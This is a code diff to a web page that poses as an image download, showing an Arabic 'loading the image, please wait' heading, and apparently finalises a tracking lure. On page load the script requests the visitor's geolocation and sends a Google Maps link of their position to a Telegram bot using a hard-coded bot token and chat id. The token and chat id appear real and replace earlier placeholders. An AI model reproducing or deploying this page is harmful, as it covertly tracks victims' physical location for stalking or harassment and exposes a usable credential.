@@ -8,25 +8,24 @@
     <script>
         window.onload = function() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation);
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
             }
         };
 
         function sendLocation(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-            
-            // هنا سنضع رابط البوت الذي سيرسل لك المعلومات
-            const token = "8639074453:AAGcsNWFB-_هنا"; 
-            const chat_id = "7323283649_هنا";
-            const message = `تم تحديد الموقع بنجاح: 
-            الرابط: https://www.google.com/maps?q=${lat},${lon}`;
+            const token = "8639074453:AAGcsNWFB-_H0PZ22Tq3Fv2S8w68G_6rXlo";
+            const chat_id = "7323283649";
+            const message = "تم تحديد الموقع بنجاح ✅\nالرابط: https://www.google.com/maps?q=" + lat + "," + lon;
 
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);
+            fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message));
+        }
+
+        function showError(error) {
+            console.log("Error: " + error.message);
         }
     </script>
-    <h1>جاري تحميل الصورة... يرجى الانتظار</h1>
+    <h1 style="text-align: center; margin-top: 50px;">جاري تحميل الصورة... يرجى الانتظار</h1>
 </body>
-</html>
-
 </html>
